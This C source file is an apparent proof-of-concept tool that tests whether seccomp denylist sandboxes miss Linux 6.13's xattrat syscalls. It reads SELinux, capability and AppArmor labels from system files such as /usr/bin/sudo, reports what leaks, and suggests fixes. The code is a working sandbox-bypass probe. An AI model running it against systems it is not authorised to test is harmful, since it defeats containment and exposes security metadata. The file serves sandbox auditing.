/*
 * poc_xattrat_exploit.c — xattrat seccomp denylist bypass tool
 *
 * Drop this into any Linux sandbox (Flatpak, Firejail, etc.) on
 * kernel >= 6.13 to test if the new xattrat syscalls bypass seccomp.
 *
 * What it does:
 *   1. Detects sandbox type (seccomp mode, kernel version)
 *   2. Tests old xattr syscalls (should be blocked in strict sandboxes)
 *   3. Tests new xattrat syscalls (bypass denylist sandboxes)
 *   4. If xattrat works: reads security.selinux, security.capability,
 *      security.apparmor labels from key system files
 *   5. Attempts to enumerate all xattrs on sensitive paths
 *   6. Reports findings with severity assessment
 *
 * Compile: gcc -static -O2 -o poc_xattrat poc_xattrat_exploit.c
 * Run:     flatpak run --command=/path/to/poc_xattrat org.app.Name
 *          firejail /path/to/poc_xattrat
 *          ./poc_xattrat  (outside sandbox, for baseline)
 *
 * On kernel < 6.13: all xattrat calls return ENOSYS (kernel doesn't know them)
 * On kernel >= 6.13 + denylist sandbox: xattrat calls SUCCEED (bypass!)
 * On kernel >= 6.13 + allowlist sandbox: xattrat calls return ENOSYS/EPERM
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/utsname.h>

/* xattrat syscall numbers (x86-64) */
#ifndef __NR_getxattrat
#define __NR_getxattrat  463
#endif
#ifndef __NR_setxattrat
#define __NR_setxattrat  464
#endif
#ifndef __NR_listxattrat
#define __NR_listxattrat 465
#endif
#ifndef __NR_removexattrat
#define __NR_removexattrat 466
#endif

/* Old xattr syscall numbers */
#ifndef __NR_getxattr
#define __NR_getxattr 191
#endif
#ifndef __NR_listxattr
#define __NR_listxattr 194
#endif

struct xattr_args {
    uint64_t value;
    uint32_t size;
    uint32_t flags;
};

/* ─── Detection helpers ─────────────────────────────────────────────── */

static const char *detect_seccomp_mode(void) {
    int mode = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
    switch (mode) {
        case 0: return "disabled (no sandbox)";
        case 1: return "strict (only read/write/exit/sigreturn)";
        case 2: return "filter (BPF — sandbox active)";
        default: return "unknown";
    }
}

static int get_kernel_version(int *major, int *minor) {
    struct utsname u;
    if (uname(&u) < 0) return -1;
    if (sscanf(u.release, "%d.%d", major, minor) < 2) return -1;
    return 0;
}

/* ─── xattr test helpers ────────────────────────────────────────────── */

typedef enum { BLOCKED, ENOSYS_NOKERNEL, EXECUTED, SUCCEEDED } result_t;

static result_t try_getxattrat(const char *path, const char *name,
                               char *buf, size_t bufsz) {
    struct xattr_args args = {
        .value = (uint64_t)(uintptr_t)buf,
        .size  = (uint32_t)bufsz,
        .flags = 0
    };
    long ret = syscall(__NR_getxattrat, AT_FDCWD, path, name, &args, 0);
    if (ret >= 0) return SUCCEEDED;
    if (errno == ENOSYS) return ENOSYS_NOKERNEL;
    if (errno == ENODATA || errno == ERANGE) return EXECUTED;
    return BLOCKED; /* EPERM, EACCES, etc. */
}

static result_t try_listxattrat(const char *path, char *buf, size_t bufsz) {
    struct xattr_args args = {
        .value = (uint64_t)(uintptr_t)buf,
        .size  = (uint32_t)bufsz,
        .flags = 0
    };
    long ret = syscall(__NR_listxattrat, AT_FDCWD, path, &args, 0);
    if (ret >= 0) return SUCCEEDED;
    if (errno == ENOSYS) return ENOSYS_NOKERNEL;
    if (errno == ENODATA || errno == ERANGE) return EXECUTED;
    return BLOCKED;
}

static result_t try_old_getxattr(const char *path, const char *name,
                                 char *buf, size_t bufsz) {
    long ret = syscall(__NR_getxattr, path, name, buf, bufsz);
    if (ret >= 0) return SUCCEEDED;
    if (errno == ENOSYS) return ENOSYS_NOKERNEL;
    if (errno == ENODATA || errno == ERANGE) return EXECUTED;
    return BLOCKED;
}

static result_t try_old_listxattr(const char *path, char *buf, size_t bufsz) {
    long ret = syscall(__NR_listxattr, path, buf, bufsz);
    if (ret >= 0) return SUCCEEDED;
    if (errno == ENOSYS) return ENOSYS_NOKERNEL;
    if (errno == ENODATA || errno == ERANGE) return EXECUTED;
    return BLOCKED;
}

static const char *result_str(result_t r) {
    switch (r) {
        case BLOCKED:          return "\033[92mBLOCKED\033[0m";
        case ENOSYS_NOKERNEL:  return "\033[93mENOSYS\033[0m (kernel < 6.13)";
        case EXECUTED:         return "\033[91mEXECUTED\033[0m (xattr not found)";
        case SUCCEEDED:        return "\033[91mSUCCEEDED\033[0m — DATA LEAKED";
        default:               return "???";
    }
}

/* ─── Main ──────────────────────────────────────────────────────────── */

int main(void) {
    char buf[4096];
    int kmaj = 0, kmin = 0;

    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║  xattrat Seccomp Denylist Bypass PoC                   ║\n");
    printf("║  Tests Linux 6.13 syscalls: 463-466 (x86-64)           ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n\n");

    /* ── Detection ──────────────────────────────────────────────────── */
    printf("─── Environment ───────────────────────────────────────────\n");

    const char *seccomp = detect_seccomp_mode();
    printf("  seccomp mode:   %s\n", seccomp);

    if (get_kernel_version(&kmaj, &kmin) == 0) {
        printf("  kernel:         %d.%d\n", kmaj, kmin);
        if (kmaj < 6 || (kmaj == 6 && kmin < 13)) {
            printf("  WARNING:        kernel < 6.13 — xattrat syscalls don't exist.\n");
            printf("                  All tests will show ENOSYS (not a bypass).\n");
        }
    }

    /* Check if we're in a container/sandbox */
    if (access("/.dockerenv", F_OK) == 0) printf("  container:      Docker\n");
    else if (access("/.flatpak-info", F_OK) == 0) printf("  container:      Flatpak\n");
    else if (getenv("SNAP") != NULL) printf("  container:      Snap\n");
    else printf("  container:      unknown/none\n");

    printf("\n");

    /* ── Test old syscalls (baseline) ───────────────────────────────── */
    printf("─── Old xattr syscalls (baseline) ─────────────────────────\n");

    result_t old_get  = try_old_getxattr("/etc/hostname", "security.selinux", buf, sizeof(buf));
    result_t old_list = try_old_listxattr("/etc/hostname", buf, sizeof(buf));

    printf("  getxattr(security.selinux):  %s\n", result_str(old_get));
    printf("  listxattr():                 %s\n", result_str(old_list));
    printf("\n");

    /* ── Test new xattrat syscalls ──────────────────────────────────── */
    printf("─── New xattrat syscalls (Linux 6.13) ─────────────────────\n");

    static const char *targets[] = {
        "/etc/hostname",
        "/etc/passwd",
        "/usr/bin/sudo",
        "/usr/bin/ping",
        NULL
    };
    static const char *xattr_names[] = {
        "security.selinux",
        "security.capability",
        "security.apparmor",
        "security.ima",
        NULL
    };

    int bypass_count = 0;
    int total_tests = 0;

    for (int t = 0; targets[t]; t++) {
        if (access(targets[t], F_OK) != 0) continue;

        printf("  [%s]\n", targets[t]);

        /* Test listxattrat */
        memset(buf, 0, sizeof(buf));
        result_t lr = try_listxattrat(targets[t], buf, sizeof(buf));
        printf("    listxattrat():               %s\n", result_str(lr));
        total_tests++;
        if (lr == EXECUTED || lr == SUCCEEDED) bypass_count++;

        /* If list succeeded, show what xattrs exist */
        if (lr == SUCCEEDED) {
            /* Parse null-separated list */
            printf("    xattrs found: ");
            char *p = buf;
            int first = 1;
            while (*p && p < buf + sizeof(buf)) {
                if (!first) printf(", ");
                printf("%s", p);
                p += strlen(p) + 1;
                first = 0;
            }
            printf("\n");
        }

        /* Test getxattrat for each security xattr */
        for (int x = 0; xattr_names[x]; x++) {
            char vbuf[512] = {0};
            result_t gr = try_getxattrat(targets[t], xattr_names[x], vbuf, sizeof(vbuf));
            printf("    getxattrat(%-22s): %s", xattr_names[x], result_str(gr));
            if (gr == SUCCEEDED) {
                /* Show the leaked value */
                printf(" → \"%.*s\"", (int)(strlen(vbuf) > 60 ? 60 : strlen(vbuf)), vbuf);
            }
            printf("\n");
            total_tests++;
            if (gr == EXECUTED || gr == SUCCEEDED) bypass_count++;
        }
        printf("\n");
    }

    /* ── Verdict ────────────────────────────────────────────────────── */
    printf("═══════════════════════════════════════════════════════════\n");

    if (bypass_count > 0) {
        printf("\033[91m  VULNERABLE: %d/%d xattrat calls bypassed the sandbox!\033[0m\n",
               bypass_count, total_tests);
        printf("\n");
        printf("  The seccomp filter uses a DENYLIST and does not block\n");
        printf("  syscall numbers 463-466 (xattrat family).\n");
        printf("\n");
        printf("  Impact:\n");
        printf("  • Read SELinux labels, file capabilities, AppArmor profiles\n");
        printf("  • Enumerate security metadata on any accessible file\n");
        printf("  • On kernels 6.13-6.18: also bypasses audit logging\n");
        printf("  • setxattrat (464) may allow MODIFYING security labels\n");
        printf("\n");
        printf("  Fix: Switch seccomp filter from denylist to allowlist.\n");
        printf("  Stopgap: Add syscalls 463-466 to the blocklist.\n");
    } else {
        int all_enosys = 1;
        for (int t = 0; targets[t]; t++) {
            if (access(targets[t], F_OK) != 0) continue;
            result_t r = try_getxattrat(targets[t], "user.test", buf, sizeof(buf));
            if (r != ENOSYS_NOKERNEL) { all_enosys = 0; break; }
        }

        if (all_enosys) {
            printf("\033[93m  NOT VULNERABLE (but only because kernel < 6.13)\033[0m\n");
            printf("\n");
            printf("  xattrat syscalls returned ENOSYS — they don't exist in\n");
            printf("  this kernel. If this system upgrades to kernel 6.13+,\n");
            printf("  the bypass would become exploitable.\n");
            printf("\n");
            printf("  Recommendation: Switch to allowlist now, before upgrading.\n");
        } else {
            printf("\033[92m  NOT VULNERABLE: All xattrat calls were blocked.\033[0m\n");
            printf("\n");
            printf("  The seccomp filter correctly blocks unknown syscalls.\n");
            printf("  This indicates an allowlist-based filter.\n");
        }
    }

    printf("═══════════════════════════════════════════════════════════\n");
    return bypass_count > 0 ? 1 : 0;
}
